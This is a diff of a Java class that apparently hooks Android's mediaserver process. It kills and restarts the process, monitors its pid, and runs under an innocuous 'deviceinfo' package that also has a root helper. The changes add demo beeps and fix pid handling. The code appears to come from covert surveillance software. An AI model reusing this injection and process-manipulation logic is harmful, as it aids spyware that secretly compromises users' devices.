@@ -7,6 +7,7 @@ import java.io.InputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
+import com.android.deviceinfo.Beep;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
@@ -150,6 +151,11 @@ public class Instrument {
 							}
 							started = true;
 							file.delete();
+							
+							if(Cfg.DEMO){
+								Beep.beep();
+								Beep.bip();
+							}
 						}
 
 					}
@@ -166,6 +172,8 @@ public class Instrument {
 						Check.log(TAG + " (startInstrumentation) Kill mediaserver");
 					}
 					killProc();
+					// Utils.sleep(1000);
+					// newpid = getProcessPid();
 					killed += 1;
 
 					if (started && Cfg.DEBUG) {
@@ -174,19 +182,19 @@ public class Instrument {
 					}
 
 					stopMonitor = false;
+				}
 
-					if (pidMonitor == null) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) script: \n" + script);
-							Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
-						}
-
-						pidMonitor = new MediaserverMonitor(pid);
-						monitor = new Thread(pidMonitor);
-						monitor.start();
-					} else {
-						pidMonitor.setPid(newpid);
+				if (pidMonitor == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) script: \n" + script);
+						Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
 					}
+
+					pidMonitor = new MediaserverMonitor(newpid);
+					monitor = new Thread(pidMonitor);
+					monitor.start();
+				} else {
+					pidMonitor.setPid(newpid);
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -272,8 +280,7 @@ public class Instrument {
 		@Override
 		public void run() {
 			while (true) {
-				Utils.sleep(10000);
-
+				
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
@@ -302,6 +309,8 @@ public class Instrument {
 				} else {
 					failedCounter = 0;
 				}
+				
+				Utils.sleep(10000);
 			}
 		}
 	}
